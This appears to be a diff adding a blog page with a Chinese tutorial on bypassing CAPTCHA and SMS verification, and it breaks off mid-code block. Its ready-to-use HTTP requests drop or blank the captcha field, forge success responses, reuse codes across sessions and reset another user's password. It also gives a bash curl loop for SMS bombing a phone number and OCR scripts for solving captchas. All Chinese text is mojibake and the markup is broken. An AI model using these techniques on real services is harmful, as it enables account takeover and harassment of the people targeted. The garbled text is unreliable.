+<h1 id="鐩存帴鎶撳寘锛屽垹闄ら獙璇佺爜鍙傛暟锛岄噸鏀惧嵆鍙-POST-login-HTTP-1-1"><a href="#鐩存帴鎶撳寘锛屽垹闄ら獙璇佺爜鍙傛暟锛岄噸鏀惧嵆鍙-POST-login-HTTP-1-1" class="headerlink" title="鐩存帴鎶撳寘锛屽垹闄ら獙璇佺爜鍙傛暟锛岄噸鏀惧嵆鍙?POST &#x2F;login HTTP&#x2F;1.1"></a>鐩存帴鎶撳寘锛屽垹闄ら獙璇佺爜鍙傛暟锛岄噸鏀惧嵆鍙?POST &#x2F;login HTTP&#x2F;1.1</h1><p>Host: target.com<br>Content-Type: application&#x2F;x-www-form-urlencoded</p>
+<p>username&#x3D;admin&amp;password&#x3D;admin123&amp;captcha&#x3D;浠绘剰鍊?</p>
+<h1 id="鎴栫洿鎺ュ垹闄-captcha-鍙傛暟"><a href="#鎴栫洿鎺ュ垹闄-captcha-鍙傛暟" class="headerlink" title="鎴栫洿鎺ュ垹闄?captcha 鍙傛暟"></a>鎴栫洿鎺ュ垹闄?captcha 鍙傛暟</h1><p>POST &#x2F;login HTTP&#x2F;1.1<br>Host: target.com<br>Content-Type: application&#x2F;x-www-form-urlencoded</p>
+<p>username&#x3D;admin&amp;password&#x3D;admin123</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 3.2 鍓嶇楠岃瘉缁撴灉鍙鏀?</span><br><span class="line">**婕忔礊鍘熺悊**锛氶獙璇佺爜鐨勯獙璇佺粨鏋滈€氳繃鍓嶇杩斿洖锛堝 JSON 鍝嶅簲涓殑 `success: true/false`锛夛紝鏀诲嚮鑰呭彲浠ヤ慨鏀瑰搷搴斿寘缁曡繃銆?</span><br><span class="line">```http</span><br><span class="line"># 鍘熷鍝嶅簲锛堥獙璇佸け璐ワ級</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;: false, &quot;msg&quot;: &quot;楠岃瘉鐮侀敊璇?&#125;</span><br><span class="line"></span><br><span class="line"># 淇敼涓?HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;: true, &quot;msg&quot;: &quot;楠岃瘉鐮佹纭?&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="鍒╃敤鏂瑰紡锛氫娇鐢-BurpSuite-鐨-Intercept-Server-Response-鍔熻兘锛屾嫤鎴搷搴斿苟淇敼銆"><a href="#鍒╃敤鏂瑰紡锛氫娇鐢-BurpSuite-鐨-Intercept-Server-Response-鍔熻兘锛屾嫤鎴搷搴斿苟淇敼銆" class="headerlink" title="鍒╃敤鏂瑰紡锛氫娇鐢?BurpSuite 鐨?Intercept Server Response 鍔熻兘锛屾嫤鎴搷搴斿苟淇敼銆?"></a><strong>鍒╃敤鏂瑰紡</strong>锛氫娇鐢?BurpSuite 鐨?<code>Intercept Server Response</code> 鍔熻兘锛屾嫤鎴搷搴斿苟淇敼銆?</h2><h2 id="鍥涖€侀€昏緫缂洪櫡缁曡繃"><a href="#鍥涖€侀€昏緫缂洪櫡缁曡繃" class="headerlink" title="鍥涖€侀€昏緫缂洪櫡缁曡繃"></a>鍥涖€侀€昏緫缂洪櫡缁曡繃</h2><h3 id="4-1-楠岃瘉鐮佹湭鏍￠獙"><a href="#4-1-楠岃瘉鐮佹湭鏍￠獙" class="headerlink" title="4.1 楠岃瘉鐮佹湭鏍￠獙"></a>4.1 楠岃瘉鐮佹湭鏍￠獙</h3><p><strong>婕忔礊鍘熺悊</strong>锛氳櫧鐒跺墠绔湁楠岃瘉鐮佽緭鍏ユ锛屼絾鍚庣鏈楠岃瘉鐮佽繘琛屼换浣曟牎楠岋紝浠绘剰杈撳叆鍧囧彲閫氳繃銆?</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># 鏃犺杈撳叆浠€涔堥獙璇佺爜锛岄兘鑳界櫥褰曟垚鍔?POST /login HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=admin123&amp;captcha=闅忎究杈?```</span><br><span class="line"></span><br><span class="line">### 4.2 楠岃瘉鐮佸彲澶嶇敤</span><br><span class="line"></span><br><span class="line">**婕忔礊鍘熺悊**锛氶獙璇佺爜鍦ㄦ湇鍔＄楠岃瘉鎴愬姛鍚庢湭鏍囪涓?宸蹭娇鐢?锛屽鑷村悓涓€涓獙璇佺爜鍙互澶氭閲嶅浣跨敤銆?</span><br><span class="line">```http</span><br><span class="line"># 绗竴娆¤姹傦紙鑾峰彇楠岃瘉鐮?+ 楠岃瘉鎴愬姛锛?GET /captcha?t=123456 鈫?杩斿洖楠岃瘉鐮佸浘鐗?&quot;ABCD&quot;</span><br><span class="line">POST /login HTTP/1.1 鈫?captcha=ABCD 鈫?鐧诲綍鎴愬姛</span><br><span class="line"></span><br><span class="line"># 绗簩娆¤姹傦紙澶嶇敤鍚屼竴涓獙璇佺爜锛?POST /login HTTP/1.1 鈫?captcha=ABCD 鈫?浠嶇劧鐧诲綍鎴愬姛</span><br><span class="line">POST /login HTTP/1.1 鈫?captcha=ABCD 鈫?浠嶇劧鐧诲綍鎴愬姛锛堟棤闄愭锛?```</span><br><span class="line"></span><br><span class="line">**鍒╃敤鏂瑰紡**锛?1. 鎵嬪姩鑾峰彇涓€娆￠獙璇佺爜</span><br><span class="line">2. 浣跨敤 BurpSuite Intruder 杩涜鐖嗙牬锛屾墍鏈夎姹傚鐢ㄥ悓涓€涓獙璇佺爜鍊?3. 瑙傚療鍝簺璇锋眰鎴愬姛閫氳繃楠岃瘉</span><br><span class="line"></span><br><span class="line">### 4.3 楠岃瘉鐮佺┖鍊肩粫杩?</span><br><span class="line">**婕忔礊鍘熺悊**锛氬悗绔楠岃瘉鐮佸弬鏁扮殑澶勭悊閫昏緫涓嶄弗璋紝褰撻獙璇佺爜鍙傛暟涓虹┖鎴栦笉瀛樺湪鏃讹紝鏍￠獙閫昏緫鐩存帴璺宠繃銆?</span><br><span class="line">```http</span><br><span class="line"># 姝ｅ父璇锋眰</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">username=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=admin123&amp;captcha=ABCD</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"># 绌哄€肩粫杩囷紙鍒犻櫎 captcha 鍙傛暟锛?POST /<span class="keyword">login</span> HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">username=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=admin123</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"># 绌哄€肩粫杩囷紙captcha 鍙傛暟涓虹┖锛?POST /<span class="keyword">login</span> HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">username=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=admin123&amp;captcha=</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"># 绌哄€肩粫杩囷紙captcha=<span class="keyword">null</span> 鎴?captcha=undefined锛?POST /<span class="keyword">login</span> HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">username=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=admin123&amp;captcha=<span class="keyword">null</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-4-楠岃瘉鐮佹湭缁戝畾浼氳瘽"><a href="#4-4-楠岃瘉鐮佹湭缁戝畾浼氳瘽" class="headerlink" title="4.4 楠岃瘉鐮佹湭缁戝畾浼氳瘽"></a>4.4 楠岃瘉鐮佹湭缁戝畾浼氳瘽</h3><p><strong>婕忔礊鍘熺悊</strong>锛氶獙璇佺爜涓庣敤鎴?Session 鏈粦瀹氾紝鏀诲嚮鑰呭彲浠ヨ嚜宸辫幏鍙栦竴涓湁鏁堥獙璇佺爜锛岀劧鍚庡湪鍏朵粬浼氳瘽涓娇鐢ㄣ€?</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 鏀诲嚮鑰?A 鑾峰彇楠岃瘉鐮?GET /captcha 鈫?杩斿洖鍥剧墖 &quot;EFGH&quot;锛圫essionID: AAAA锛?</span><br><span class="line"># 鏀诲嚮鑰?B 浣跨敤 A 鐨勯獙璇佺爜</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=BBBB</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">username</span><span class="operator">=</span>admin<span class="variable">&amp;password</span>=admin123<span class="variable">&amp;captcha</span>=EFGH  鈫?浣跨敤 A 鑾峰彇鐨勯獙璇佺爜</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>鍒╃敤鏂瑰紡</strong>锛?1. 浣跨敤 Session A 鑾峰彇楠岃瘉鐮?2. 鍒涘缓 Session B锛屼娇鐢?Session A 鐨勯獙璇佺爜鍊?3. 濡傛灉 Session B 楠岃瘉閫氳繃锛屽垯瀛樺湪鏈粦瀹氭紡娲?</p>
+<h3 id="4-5-楠岃瘉鐮佹湭缁戝畾鎿嶄綔"><a href="#4-5-楠岃瘉鐮佹湭缁戝畾鎿嶄綔" class="headerlink" title="4.5 楠岃瘉鐮佹湭缁戝畾鎿嶄綔"></a>4.5 楠岃瘉鐮佹湭缁戝畾鎿嶄綔</h3><p><strong>婕忔礊鍘熺悊</strong>锛氭湇鍔″櫒楠岃瘉浜嗛獙璇佺爜锛屼絾楠岃瘉鎴愬姛鍚庢湭灏嗛獙璇佺爜涓庣壒瀹氭搷浣滐紙濡傚瘑鐮侀噸缃€佹墜鏈哄彿淇敼锛夌粦瀹氥€傛敾鍑昏€呭彲浠ュ湪楠岃瘉鎴愬姛鍚庯紝閫氳繃淇敼璇锋眰鍙傛暟鎿嶄綔鐢ㄦ埛 A 鐨勮处鎴枫€?</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Step 1: 浣跨敤鑷繁鐨勬墜鏈哄彿鑾峰彇楠岃瘉鐮?POST /send_code HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;phone&quot;: &quot;13800000001&quot;&#125;  鈫?鏀诲嚮鑰呰嚜宸辩殑鎵嬫満鍙?</span><br><span class="line"># Step 2: 楠岃瘉鐮佹垚鍔熼獙璇佸悗锛屼慨鏀圭洰鏍囨墜鏈哄彿</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/reset_password</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-1c">&#123;<span class="string">&quot;phone&quot;</span>: <span class="string">&quot;13900000000&quot;</span>, <span class="string">&quot;code&quot;</span>: <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;new_password&quot;</span>: <span class="string">&quot;hacked&quot;</span>&#125;  </span></span><br><span class="line"><span class="language-1c"><span class="meta"># phone 鍙傛暟鏀逛负鐩爣鐢ㄦ埛锛屼絾楠岃瘉鐮佹槸鏀诲嚮鑰呰嚜宸辩殑</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-6-楠岃瘉鐮佽繃鏈熸椂闂磋繃闀"><a href="#4-6-楠岃瘉鐮佽繃鏈熸椂闂磋繃闀" class="headerlink" title="4.6 楠岃瘉鐮佽繃鏈熸椂闂磋繃闀?"></a>4.6 楠岃瘉鐮佽繃鏈熸椂闂磋繃闀?</h3><p><strong>婕忔礊鍘熺悊</strong>锛氶獙璇佺爜鏈夋晥鏃堕棿杩囬暱锛堝 30 鍒嗛挓浠ヤ笂锛夛紝缁欐敾鍑昏€呭厖瓒崇殑鐖嗙牬鏃堕棿銆?</p>
+<table>
+<thead>
+<tr>
+<th align="left">鏈夋晥鏃堕暱</th>
+<th align="center">瀹夊叏绛夌骇</th>
+<th align="left">璇存槑</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">&lt; 60 绉?</td>
+<td align="center">馃煝 瀹夊叏</td>
+<td align="left">鐭湁鏁堟湡鍐呴毦浠ョ垎鐮?</td>
+</tr>
+<tr>
+<td align="left">1-5 鍒嗛挓</td>
+<td align="center">馃煛 涓嵄</td>
+<td align="left">4 浣嶉獙璇佺爜鐞嗚涓婂彲鐖嗙牬</td>
+</tr>
+<tr>
+<td align="left">5-30 鍒嗛挓</td>
+<td align="center">馃敶 楂樺嵄</td>
+<td align="left">鐖嗙牬绐楀彛瓒冲澶?</td>
+</tr>
+<tr>
+<td align="left">30 鍒嗛挓浠ヤ笂</td>
+<td align="center">馃敶 <strong>涓ラ噸</strong></td>
+<td align="left">楠岃瘉鐮佸熀鏈け鏁?</td>
+</tr>
+</tbody></table>
+<h3 id="4-7-楠岃瘉鐮佸洖鏄"><a href="#4-7-楠岃瘉鐮佸洖鏄" class="headerlink" title="4.7 楠岃瘉鐮佸洖鏄?"></a>4.7 楠岃瘉鐮佸洖鏄?</h3><p><strong>婕忔礊鍘熺悊</strong>锛氶獙璇佺爜鐩存帴浠ユ槑鏂囧舰寮忓瓨鍦ㄤ簬鍝嶅簲鍖呬腑锛堝 HTML 椤甸潰銆丣SON 鍝嶅簲銆丆ookie 绛夛級銆?</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 鎯呭喌 1: 楠岃瘉鐮佸湪椤甸潰 HTML 涓?GET /captcha_page HTTP/1.1</span><br><span class="line">...</span><br><span class="line">&lt;img src=&quot;/captcha?t=123456&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;captcha_code&quot; value=&quot;ABCD&quot;&gt;  鈫?楠岃瘉鐮佹槑鏂?</span><br><span class="line"># 鎯呭喌 2: 楠岃瘉鐮佸湪 JSON 鍝嶅簲涓?GET /api/captcha HTTP/1.1</span><br><span class="line">...</span><br><span class="line">&#123;&quot;code&quot;: 0, &quot;captcha&quot;: &quot;EFGH&quot;, &quot;img&quot;: &quot;/captcha/123456.png&quot;&#125;  鈫?楠岃瘉鐮佹槑鏂?</span><br><span class="line"># 鎯呭喌 3: 楠岃瘉鐮佸湪 Cookie 涓?HTTP/1.1 200 OK</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>captcha_code=IJKL; Path=/  鈫?楠岃瘉鐮佹槑鏂?```</span><br><span class="line"></span><br><span class="line">### 4.8 鐭俊楠岃瘉鐮佺垎鐮?</span><br><span class="line">**婕忔礊鍘熺悊**锛氱煭淇￠獙璇佺爜閫氬父涓?4-6 浣嶇函鏁板瓧锛屼笖鏈嶅姟绔湭闄愬埗楠岃瘉娆℃暟锛屾敾鍑昏€呭彲杩涜鐖嗙牬銆?</span><br><span class="line">```bash</span><br><span class="line"># 4 浣嶉獙璇佺爜锛?0000 绉嶇粍鍚堬紙閫氬父鍙崟鏈虹垎鐮达級</span><br><span class="line"># 6 浣嶉獙璇佺爜锛?000000 绉嶇粍鍚堬紙闇€澶氱骞惰鐖嗙牬锛?</span><br><span class="line"># 浣跨敤 BurpSuite Intruder 鐖嗙牬</span><br><span class="line"># 璁剧疆 Payload 涓?Numbers 0-9999锛? 浣嶏級/ 0-999999锛? 浣嶏級</span><br><span class="line"># 閰嶅悎 Cluster bomb 鏀诲嚮绫诲瀷</span><br></pre></td></tr></table></figure>
+
+<p><strong>鐖嗙牬鏁堢巼</strong>锛?| 楠岃瘉鐮侀暱搴?| 缁勫悎鏁?| 鍗曠嚎绋嬭€楁椂 | 澶氱嚎绋嬶紙10锛夎€楁椂 |<br>|:———-:|:——:|:———-:|:—————-:|<br>| 4 浣嶆暟瀛?| 10,000 | ~5 鍒嗛挓 | ~30 绉?|<br>| 5 浣嶆暟瀛?| 100,000 | ~50 鍒嗛挓 | ~5 鍒嗛挓 |<br>| 6 浣嶆暟瀛?| 1,000,000 | ~8 灏忔椂 | ~50 鍒嗛挓 |<br>| 4 浣嶅瓧姣?鏁板瓧 | 1,679,616 | ~14 灏忔椂 | ~1.4 灏忔椂 |</p>
+<h3 id="4-9-鐭俊杞扮偢"><a href="#4-9-鐭俊杞扮偢" class="headerlink" title="4.9 鐭俊杞扮偢"></a>4.9 鐭俊杞扮偢</h3><p><strong>婕忔礊鍘熺悊</strong>锛氬彂閫佺煭淇￠獙璇佺爜鐨勬帴鍙ｆ棤棰戠巼闄愬埗锛屾敾鍑昏€呭彲鏃犻檺娆¤皟鐢紝瀵艰嚧鐩爣鎵嬫満鏀跺埌澶ч噺鐭俊锛岄€犳垚璧勮垂鎹熷け鍜岄獨鎵般€?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 寰幆璋冪敤鍙戦€侀獙璇佺爜鎺ュ彛</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..1000&#125;; <span class="keyword">do</span></span><br><span class="line">  curl -X POST <span class="string">&quot;https://target.com/send_code&quot;</span> \</span><br><span class="line">    -d <span class="string">&quot;phone=13900000000&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="妫€娴嬫柟娉-锛-1-瀵瑰悓涓€鎵嬫満鍙疯繛缁彂閫-10-娆′互涓婇獙璇佺爜2-瑙傚療鏄惁杩樿兘缁х画鍙戦€-3-妫€鏌ユ槸鍚︽湁棰戠巼闄愬埗鎴栬涓洪獙璇"><a href="#妫€娴嬫柟娉-锛-1-瀵瑰悓涓€鎵嬫満鍙疯繛缁彂閫-10-娆′互涓婇獙璇佺爜2-瑙傚療鏄惁杩樿兘缁х画鍙戦€-3-妫€鏌ユ槸鍚︽湁棰戠巼闄愬埗鎴栬涓洪獙璇" class="headerlink" title="**妫€娴嬫柟娉?*锛?1. 瀵瑰悓涓€鎵嬫満鍙疯繛缁彂閫?10 娆′互涓婇獙璇佺爜2. 瑙傚療鏄惁杩樿兘缁х画鍙戦€?3. 妫€鏌ユ槸鍚︽湁棰戠巼闄愬埗鎴栬涓洪獙璇?"></a>**妫€娴嬫柟娉?*锛?1. 瀵瑰悓涓€鎵嬫満鍙疯繛缁彂閫?10 娆′互涓婇獙璇佺爜<br>2. 瑙傚療鏄惁杩樿兘缁х画鍙戦€?3. 妫€鏌ユ槸鍚︽湁棰戠巼闄愬埗鎴栬涓洪獙璇?</h2><h2 id="浜斻€丱CR-涓庤嚜鍔ㄥ寲璇嗗埆缁曡繃"><a href="#浜斻€丱CR-涓庤嚜鍔ㄥ寲璇嗗埆缁曡繃" class="headerlink" title="浜斻€丱CR 涓庤嚜鍔ㄥ寲璇嗗埆缁曡繃"></a>浜斻€丱CR 涓庤嚜鍔ㄥ寲璇嗗埆缁曡繃</h2><h3 id="5-1-Tesseract-OCR-璇嗗埆"><a href="#5-1-Tesseract-OCR-璇嗗埆" class="headerlink" title="5.1 Tesseract OCR 璇嗗埆"></a>5.1 Tesseract OCR 璇嗗埆</h3><p><strong>Tesseract</strong> 鏄渶甯哥敤鐨勫紑婧?OCR 寮曟搸锛岄€傜敤浜庤瘑鍒畝鍗曠殑瀛楃鍨嬮獙璇佺爜銆?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 瀹夎 Tesseract</span></span><br><span class="line"><span class="comment"># Ubuntu</span></span><br><span class="line">apt-get install tesseract-ocr</span><br><span class="line"><span class="comment"># macOS</span></span><br><span class="line">brew install tesseract</span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line"><span class="comment"># 涓嬭浇瀹夎鍖? https://github.com/UB-Mannheim/tesseract/wiki</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍩烘湰浣跨敤</span></span><br><span class="line">tesseract captcha.png stdout</span><br><span class="line"></span><br><span class="line"><span class="comment"># 鎸囧畾璇█鍜?PSM 妯″紡</span></span><br><span class="line">tesseract captcha.png stdout -l eng --psm 7</span><br></pre></td></tr></table></figure>
+
+<p><strong>PSM 妯″紡璇存槑</strong>锛?| PSM | 妯″紡 | 閫傜敤鍦烘櫙 |<br>|:—:|:—–|:———|<br>| 6 | 鍋囪缁熶竴鐨勬枃鏈潡 | 鏍囧噯鏂囨湰 |<br>| 7 | 灏嗗浘鍍忚涓哄崟琛屾枃鏈?| 楠岃瘉鐮?|<br>| 8 | 灏嗗浘鍍忚涓哄崟涓瘝 | 鐭獙璇佺爜 |<br>| 10 | 灏嗗浘鍍忚涓哄崟涓瓧绗?| 鏁板瓧楠岃瘉鐮?|</p>
+<p><strong>Python 闆嗘垚</strong>锛?&#96;&#96;&#96;python<br>import pytesseract<br>from PIL import Image, ImageFilter, ImageEnhance</p>
+<p>def ocr_captcha(image_path):<br>    “””OCR 璇嗗埆楠岃瘉鐮?””<br>    img &#x3D; Image.open(image_path)</p>
+<pre><code># 棰勫鐞嗭細鐏板害鍖?+ 浜屽€煎寲 + 闄嶅櫔
+img = img.convert(&#39;L&#39;)  # 鐏板害
+img = img.point(lambda x: 0 if x &lt; 128 else 255)  # 浜屽€煎寲
+img = img.filter(ImageFilter.MedianFilter(size=3))  # 涓€兼护娉㈤檷鍣?    
+# OCR 璇嗗埆
+code = pytesseract.image_to_string(
+    img,
+    config=&#39;--psm 7 -c tessedit_char_whitelist=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
+)
+return code.strip()
+</code></pre>
+<h1 id="浣跨敤"><a href="#浣跨敤" class="headerlink" title="浣跨敤"></a>浣跨敤</h1><p>print(ocr_captcha(‘captcha.png’))</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 5.2 鍥惧儚棰勫鐞嗘彁鍗囪瘑鍒巼</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">#!/usr/bin/env python3</span><br><span class="line">&quot;&quot;&quot;楠岃瘉鐮佸浘鍍忛澶勭悊鑴氭湰&quot;&quot;&quot;</span><br><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">def preprocess_captcha(img_path, output_path=&#x27;processed.png&#x27;):</span><br><span class="line">    &quot;&quot;&quot;鍥惧儚棰勫鐞嗘祦姘寸嚎&quot;&quot;&quot;</span><br><span class="line">    # 璇诲彇鍥惧儚</span><br><span class="line">    img = cv2.imread(img_path)</span><br><span class="line">    </span><br><span class="line">    # 1. 鐏板害鍖?    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    </span><br><span class="line">    # 2. 楂樻柉妯＄硦闄嶅櫔</span><br><span class="line">    blurred = cv2.GaussianBlur(gray, (3, 3), 0)</span><br><span class="line">    </span><br><span class="line">    # 3. 鑷€傚簲闃堝€间簩鍊煎寲</span><br><span class="line">    binary = cv2.adaptiveThreshold(</span><br><span class="line">        blurred, 255,</span><br><span class="line">        cv2.ADAPTIVE_THRESH_GAUSSIAN_C,</span><br><span class="line">        cv2.THRESH_BINARY_INV, 11, 2</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    # 4. 鍘诲櫔锛堝幓闄ゅ皬鍣偣锛?    kernel = np.ones((2, 2), np.uint8)</span><br><span class="line">    denoised = cv2.morphologyEx(binary, cv2.MORPH_OPEN, kernel)</span><br><span class="line">    </span><br><span class="line">    # 5. 鑶ㄨ儉锛堣繛鎺ユ柇瑁傜殑瀛楃锛?    dilated = cv2.dilate(denoised, kernel, iterations=1)</span><br><span class="line">    </span><br><span class="line">    # 6. 杈圭紭妫€娴?    edges = cv2.Canny(dilated, 30, 150)</span><br><span class="line">    </span><br><span class="line">    cv2.imwrite(output_path, dilated)</span><br><span class="line">    return output_path</span><br><span class="line"></span><br><span class="line"># 浣跨敤</span><br><span class="line">preprocess_captcha(&#x27;captcha.png&#x27;, &#x27;processed.png&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-娣卞害瀛︿範妯″瀷璁粌"><a href="#5-3-娣卞害瀛︿範妯″瀷璁粌" class="headerlink" title="5.3 娣卞害瀛︿範妯″瀷璁粌"></a>5.3 娣卞害瀛︿範妯″瀷璁粌</h3><p>瀵逛簬澶嶆潅鐨勯獙璇佺爜锛堝瓧绗︾矘杩炪€佹壄鏇层€佸共鎵扮嚎瀵嗛泦锛夛紝浼犵粺 OCR 鏁堟灉涓嶄匠锛岄渶瑕佽缁?CNN 娣卞害瀛︿範妯″瀷銆?</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 